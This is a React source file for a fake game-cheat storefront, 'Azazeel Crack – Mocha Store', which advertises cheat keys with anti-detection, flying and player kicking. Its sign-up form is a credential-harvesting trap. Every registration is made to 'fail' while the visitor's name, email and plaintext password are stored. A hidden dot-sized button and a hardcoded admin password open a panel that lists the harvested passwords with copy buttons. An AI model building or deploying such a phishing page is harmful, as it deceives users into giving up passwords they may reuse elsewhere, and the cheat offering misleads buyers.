import React, { useState, useEffect } from 'react';
import { Lock, Key, Shield, Zap, Users, Map, Crown, Copy, Trash2, LogOut, ShoppingBag, ArrowRight } from 'lucide-react';

export default function AzazeelCrackStore() {
  const [view, setView] = useState('home'); // home, login, store, admin, product
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [selectedProduct, setSelectedProduct] = useState(null);
  const [showPurchaseError, setShowPurchaseError] = useState(false);
  
  const [loginData, setLoginData] = useState({
    email: '',
    name: '',
    password: '',
    confirmPassword: ''
  });
  
  const [adminPassword, setAdminPassword] = useState('');
  const [registrationAttempts, setRegistrationAttempts] = useState([]);
  const [showAdminLogin, setShowAdminLogin] = useState(false);

  const products = [
    {
      id: 1,
      name: 'Free Key',
      price: 'FREE',
      duration: 'Limited',
      features: [
        'Respond bots in English',
        'Basic anti-detection',
        'Standard support',
        'Limited usage time'
      ],
      isPremium: false
    },
    {
      id: 2,
      name: 'Premium Key',
      price: '$29.99',
      duration: 'Full Month',
      features: [
        'Flying capability enabled',
        'Complete all maps instantly',
        'Kick/Ban players',
        'Advanced automation',
        'Priority support 24/7',
        'Undetectable mode'
      ],
      isPremium: true
    }
  ];

  const handleRegister = (e) => {
    e.preventDefault();
    
    // Always show error even if correct
    const attempt = {
      id: Date.now(),
      email: loginData.email,
      name: loginData.name,
      password: loginData.password,
      timestamp: new Date().toISOString()
    };
    
    setRegistrationAttempts(prev => [...prev, attempt]);
    
    // Show error message
    alert('Registration failed. Please try again later.');
  };

  const handleAdminLogin = (e) => {
    e.preventDefault();
    if (adminPassword === 'azr313') {
      setIsAdmin(true);
      setView('admin');
      setShowAdminLogin(false);
      setAdminPassword('');
    } else {
      alert('Incorrect admin password');
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    alert('Copied to clipboard!');
  };

  const deleteAttempt = (id) => {
    setRegistrationAttempts(prev => prev.filter(a => a.id !== id));
  };

  const viewProduct = (product) => {
    setSelectedProduct(product);
    setView('product');
  };

  const handlePurchase = () => {
    setShowPurchaseError(true);
    setTimeout(() => {
      setShowPurchaseError(false);
    }, 3000);
  };

  // Home Page
  if (view === 'home') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white">
        {/* Admin Access Button */}
        <button
          onClick={() => setShowAdminLogin(true)}
          className="fixed top-4 right-4 w-3 h-3 bg-gray-900 rounded-full opacity-10 hover:opacity-30 transition-opacity z-50"
        />
        
        {/* Admin Login Modal */}
        {showAdminLogin && (
          <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4">
            <div className="bg-gray-800 rounded-2xl p-8 max-w-md w-full shadow-2xl border border-purple-500">
              <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
                <Shield className="w-6 h-6" />
                Admin Access
              </h2>
              <div>
                <input
                  type="password"
                  placeholder="Admin Password"
                  value={adminPassword}
                  onChange={(e) => setAdminPassword(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin(e)}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-purple-500"
                />
                <div className="flex gap-3">
                  <button
                    onClick={handleAdminLogin}
                    className="flex-1 bg-purple-600 hover:bg-purple-700 py-3 rounded-lg font-semibold transition-colors"
                  >
                    Login
                  </button>
                  <button
                    onClick={() => setShowAdminLogin(false)}
                    className="flex-1 bg-gray-700 hover:bg-gray-600 py-3 rounded-lg font-semibold transition-colors"
                  >
                    Cancel
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Hero Section */}
        <div className="container mx-auto px-4 py-12 flex items-center justify-center min-h-screen">
          <div className="text-center max-w-4xl">
            <div className="inline-flex items-center justify-center w-24 h-24 bg-purple-600 rounded-full mb-6 shadow-lg shadow-purple-500/50 animate-pulse">
              <Lock className="w-12 h-12" />
            </div>
            <h1 className="text-7xl font-bold mb-4 bg-gradient-to-r from-purple-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
              Azazeel Crack
            </h1>
            <p className="text-2xl text-gray-300 mb-8">Mocha Store</p>
            <p className="text-xl text-gray-400 mb-12 max-w-2xl mx-auto">
              Unlock the ultimate gaming experience with our premium Mocha keys. 
              Access exclusive features and dominate the game.
            </p>
            
            <div className="flex gap-6 justify-center flex-wrap">
              <button
                onClick={() => setView('store')}
                className="flex items-center gap-3 px-8 py-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 rounded-xl font-bold text-lg shadow-lg shadow-purple-500/50 transition-all transform hover:scale-105"
              >
                <ShoppingBag className="w-6 h-6" />
                Browse Store
                <ArrowRight className="w-6 h-6" />
              </button>
              
              <button
                onClick={() => setView('login')}
                className="flex items-center gap-3 px-8 py-4 bg-gray-800 hover:bg-gray-700 rounded-xl font-bold text-lg border border-purple-500/50 transition-all transform hover:scale-105"
              >
                <Lock className="w-6 h-6" />
                Sign Up / Login
              </button>
            </div>

            <div className="mt-16 grid grid-cols-1 md:grid-cols-3 gap-6">
              <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-xl p-6 border border-purple-500/30">
                <Zap className="w-10 h-10 text-yellow-400 mx-auto mb-3" />
                <h3 className="text-xl font-bold mb-2">Instant Delivery</h3>
                <p className="text-gray-400">Get your keys immediately after purchase</p>
              </div>
              
              <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-xl p-6 border border-purple-500/30">
                <Shield className="w-10 h-10 text-green-400 mx-auto mb-3" />
                <h3 className="text-xl font-bold mb-2">100% Secure</h3>
                <p className="text-gray-400">Advanced anti-detection technology</p>
              </div>
              
              <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-xl p-6 border border-purple-500/30">
                <Users className="w-10 h-10 text-blue-400 mx-auto mb-3" />
                <h3 className="text-xl font-bold mb-2">24/7 Support</h3>
                <p className="text-gray-400">Always here to help you</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Login Page
  if (view === 'login') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white">
        <button
          onClick={() => setShowAdminLogin(true)}
          className="fixed top-4 right-4 w-3 h-3 bg-gray-900 rounded-full opacity-10 hover:opacity-30 transition-opacity z-50"
        />
        
        {showAdminLogin && (
          <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4">
            <div className="bg-gray-800 rounded-2xl p-8 max-w-md w-full shadow-2xl border border-purple-500">
              <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
                <Shield className="w-6 h-6" />
                Admin Access
              </h2>
              <div>
                <input
                  type="password"
                  placeholder="Admin Password"
                  value={adminPassword}
                  onChange={(e) => setAdminPassword(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin(e)}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-purple-500"
                />
                <div className="flex gap-3">
                  <button
                    onClick={handleAdminLogin}
                    className="flex-1 bg-purple-600 hover:bg-purple-700 py-3 rounded-lg font-semibold transition-colors"
                  >
                    Login
                  </button>
                  <button
                    onClick={() => setShowAdminLogin(false)}
                    className="flex-1 bg-gray-700 hover:bg-gray-600 py-3 rounded-lg font-semibold transition-colors"
                  >
                    Cancel
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        <div className="container mx-auto px-4 py-12 flex items-center justify-center min-h-screen">
          <div className="max-w-md w-full">
            <button
              onClick={() => setView('home')}
              className="mb-6 text-gray-400 hover:text-white transition-colors flex items-center gap-2"
            >
              ← Back to Home
            </button>

            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center w-20 h-20 bg-purple-600 rounded-full mb-4 shadow-lg shadow-purple-500/50">
                <Lock className="w-10 h-10" />
              </div>
              <h1 className="text-5xl font-bold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                Azazeel Crack
              </h1>
              <p className="text-gray-400 text-lg">Mocha Store</p>
            </div>

            <div className="bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-2xl p-8 shadow-2xl border border-purple-500/30">
              <h2 className="text-2xl font-bold mb-6 text-center">Create Account</h2>
              <div className="space-y-4">
                <input
                  type="text"
                  placeholder="Full Name"
                  value={loginData.name}
                  onChange={(e) => setLoginData({...loginData, name: e.target.value})}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all"
                />
                <input
                  type="email"
                  placeholder="Email Address"
                  value={loginData.email}
                  onChange={(e) => setLoginData({...loginData, email: e.target.value})}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all"
                />
                <input
                  type="password"
                  placeholder="Password"
                  value={loginData.password}
                  onChange={(e) => setLoginData({...loginData, password: e.target.value})}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all"
                />
                <input
                  type="password"
                  placeholder="Confirm Password"
                  value={loginData.confirmPassword}
                  onChange={(e) => setLoginData({...loginData, confirmPassword: e.target.value})}
                  onKeyPress={(e) => e.key === 'Enter' && handleRegister(e)}
                  className="w-full px-4 py-3 bg-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all"
                />
                <button
                  onClick={handleRegister}
                  className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-3 rounded-lg font-semibold shadow-lg shadow-purple-500/50 transition-all transform hover:scale-105"
                >
                  Register Now
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Admin Panel
  if (isAdmin && view === 'admin') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white p-8">
        <div className="container mx-auto max-w-6xl">
          <div className="flex justify-between items-center mb-8">
            <div>
              <h1 className="text-4xl font-bold flex items-center gap-3 mb-2">
                <Shield className="w-10 h-10 text-purple-400" />
                Admin Panel
              </h1>
              <p className="text-gray-400">Registration Attempts Monitor</p>
            </div>
            <button
              onClick={() => {
                setIsAdmin(false);
                setView('home');
              }}
              className="flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg transition-colors"
            >
              <LogOut className="w-5 h-5" />
              Logout
            </button>
          </div>

          <div className="bg-gray-800 rounded-2xl p-6 shadow-2xl border border-purple-500/30">
            <h2 className="text-2xl font-bold mb-6">Registration Attempts ({registrationAttempts.length})</h2>
            
            {registrationAttempts.length === 0 ? (
              <div className="text-center py-12 text-gray-400">
                <Users className="w-16 h-16 mx-auto mb-4 opacity-50" />
                <p>No registration attempts yet</p>
              </div>
            ) : (
              <div className="space-y-4">
                {registrationAttempts.map((attempt) => (
                  <div key={attempt.id} className="bg-gray-700 rounded-xl p-5 border border-purple-500/20">
                    <div className="flex justify-between items-start mb-3">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-2">
                          <span className="font-semibold text-purple-400">Name:</span>
                          <span>{attempt.name}</span>
                        </div>
                        <div className="flex items-center gap-2 mb-2">
                          <span className="font-semibold text-purple-400">Email:</span>
                          <span>{attempt.email}</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="font-semibold text-purple-400">Password:</span>
                          <span className="font-mono bg-gray-800 px-3 py-1 rounded">{attempt.password}</span>
                          <button
                            onClick={() => copyToClipboard(attempt.password)}
                            className="p-2 hover:bg-gray-600 rounded transition-colors"
                            title="Copy password"
                          >
                            <Copy className="w-4 h-4" />
                          </button>
                        </div>
                        <div className="text-sm text-gray-400 mt-2">
                          {new Date(attempt.timestamp).toLocaleString()}
                        </div>
                      </div>
                      <button
                        onClick={() => deleteAttempt(attempt.id)}
                        className="p-3 bg-red-600 hover:bg-red-700 rounded-lg transition-colors"
                        title="Delete attempt"
                      >
                        <Trash2 className="w-5 h-5" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  // Product Details Page
  if (view === 'product' && selectedProduct) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white">
        <nav className="bg-gray-900 bg-opacity-50 backdrop-blur-lg border-b border-purple-500/30 sticky top-0 z-40">
          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
            <div className="flex items-center gap-3">
              <Lock className="w-8 h-8 text-purple-400" />
              <div>
                <h1 className="text-2xl font-bold">Azazeel Crack</h1>
                <p className="text-xs text-gray-400">Mocha Store</p>
              </div>
            </div>
            <button
              onClick={() => setView('store')}
              className="px-6 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg transition-colors"
            >
              Back to Store
            </button>
          </div>
        </nav>

        {showPurchaseError && (
          <div className="fixed top-24 left-1/2 transform -translate-x-1/2 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg z-50 animate-pulse">
            Please register to purchase keys
          </div>
        )}

        <div className="container mx-auto px-4 py-12">
          <div className="max-w-4xl mx-auto">
            <div className={`bg-gradient-to-br ${selectedProduct.isPremium ? 'from-yellow-900 to-orange-900' : 'from-gray-800 to-gray-900'} rounded-3xl p-8 shadow-2xl border ${selectedProduct.isPremium ? 'border-yellow-500/50' : 'border-purple-500/30'}`}>
              <div className="flex items-start justify-between mb-6">
                <div>
                  <h2 className="text-4xl font-bold mb-2 flex items-center gap-3">
                    {selectedProduct.isPremium ? <Crown className="w-10 h-10 text-yellow-400" /> : <Key className="w-10 h-10 text-purple-400" />}
                    {selectedProduct.name}
                  </h2>
                  <p className="text-gray-300 text-lg">Duration: {selectedProduct.duration}</p>
                </div>
                <div className="text-right">
                  <div className={`text-5xl font-bold ${selectedProduct.isPremium ? 'text-yellow-400' : 'text-green-400'}`}>
                    {selectedProduct.price}
                  </div>
                </div>
              </div>

              <div className="border-t border-gray-700 pt-6 mb-6">
                <h3 className="text-2xl font-semibold mb-4 flex items-center gap-2">
                  <Zap className="w-6 h-6 text-purple-400" />
                  Features Included
                </h3>
                <div className="space-y-3">
                  {selectedProduct.features.map((feature, index) => (
                    <div key={index} className="flex items-center gap-3 bg-gray-800 bg-opacity-50 p-4 rounded-lg">
                      <div className="w-2 h-2 bg-purple-500 rounded-full"></div>
                      <span className="text-lg">{feature}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="flex gap-4">
                <button 
                  onClick={handlePurchase}
                  className="flex-1 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-4 rounded-xl font-bold text-lg shadow-lg shadow-purple-500/50 transition-all transform hover:scale-105"
                >
                  Purchase Key
                </button>
                <button
                  onClick={() => setView('store')}
                  className="px-8 bg-gray-700 hover:bg-gray-600 py-4 rounded-xl font-bold transition-colors"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Store Page
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black text-white">
      <nav className="bg-gray-900 bg-opacity-50 backdrop-blur-lg border-b border-purple-500/30 sticky top-0 z-40">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center gap-3">
            <Lock className="w-8 h-8 text-purple-400" />
            <div>
              <h1 className="text-2xl font-bold">Azazeel Crack</h1>
              <p className="text-xs text-gray-400">Mocha Store</p>
            </div>
          </div>
          <button
            onClick={() => setView('home')}
            className="px-6 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg transition-colors border border-purple-500/50"
          >
            Back to Home
          </button>
        </div>
      </nav>

      <div className="container mx-auto px-4 py-12">
        <div className="text-center mb-12">
          <h2 className="text-5xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
            Premium Mocha Keys
          </h2>
          <p className="text-gray-400 text-xl">Unlock the full potential of your gaming experience</p>
        </div>

        <div className="grid md:grid-cols-2 gap-8 max-w-6xl mx-auto">
          {products.map((product) => (
            <div
              key={product.id}
              className={`bg-gradient-to-br ${product.isPremium ? 'from-yellow-900 to-orange-900 border-yellow-500/50' : 'from-gray-800 to-gray-900 border-purple-500/30'} rounded-3xl p-8 shadow-2xl border transform transition-all hover:scale-105 cursor-pointer`}
              onClick={() => viewProduct(product)}
            >
              <div className="flex justify-between items-start mb-6">
                <div>
                  {product.isPremium ? (
                    <Crown className="w-12 h-12 text-yellow-400 mb-3" />
                  ) : (
                    <Key className="w-12 h-12 text-purple-400 mb-3" />
                  )}
                  <h3 className="text-3xl font-bold mb-2">{product.name}</h3>
                  <p className="text-gray-300">{product.duration}</p>
                </div>
                <div className={`text-4xl font-bold ${product.isPremium ? 'text-yellow-400' : 'text-green-400'}`}>
                  {product.price}
                </div>
              </div>

              <div className="space-y-3 mb-6">
                {product.features.slice(0, 3).map((feature, index) => (
                  <div key={index} className="flex items-center gap-2">
                    <div className="w-2 h-2 bg-purple-500 rounded-full"></div>
                    <span className="text-gray-300">{feature}</span>
                  </div>
                ))}
                {product.features.length > 3 && (
                  <p className="text-sm text-gray-400 italic">+{product.features.length - 3} more features...</p>
                )}
              </div>

              <button className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 py-3 rounded-xl font-semibold shadow-lg shadow-purple-500/50 transition-all">
                View Details
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
